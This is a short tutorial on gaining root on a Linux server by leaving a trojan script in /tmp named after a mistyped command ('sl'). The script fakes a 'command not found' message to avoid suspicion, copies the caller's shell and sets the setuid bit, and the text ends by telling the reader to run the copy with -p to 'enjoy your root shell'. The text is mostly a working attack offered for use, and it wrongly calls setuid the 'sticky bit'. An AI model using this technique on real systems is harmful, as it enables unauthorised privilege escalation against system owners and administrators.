Lets suppose you have ssh access on a server as a testuser .
You can cd on tmp directory and create the following simple script .
The whole idea is to accidentaly make a root user execute our script . This will be possible if we name our executable as a possible wrong command like sl (wrong spelled ls) .
Then we will copy root user's shell to onother executable where we will have access . Executing the new executable  will give us root privilleges.
(assuming the command spelling error happens from a root user , we'll need to wait a bit :P. You can also write multiple scripts with wrong spelled commands )

```
#cd on /tmp as any user without privilleges and create the following script.
#Its important to name your script , as a frequent wrong possible command like sl , mroe etc..
vim sl

#!/bin/bash 
echo "bash: sl not found "
cp $SHELL /tmp/myfile
chmod u+s /tmp/myfile

```
1. echo "bash: sl not found " ---> informs the user that accidentally executed our script that his command was spelled wrong , in order to not be suspicious.
2. cp $SHELL /tmp/myfile ---> copies the user's, that executed our script, bash shell to /tmp/myfile
3. chmod u+s /tmp/myfile -----> enables sticky bit , so if it is a root user we will then execute the new script , as root.

When a root user accidentally types sl instead of ls on /tmp , he runs our executable and the /tmp/myfile is finally created .It is  important to execute the new file  with the -p option to keep the privilleges of the root.

```
cd /tmp
./myfile -p

```

Enjoy your root shell.
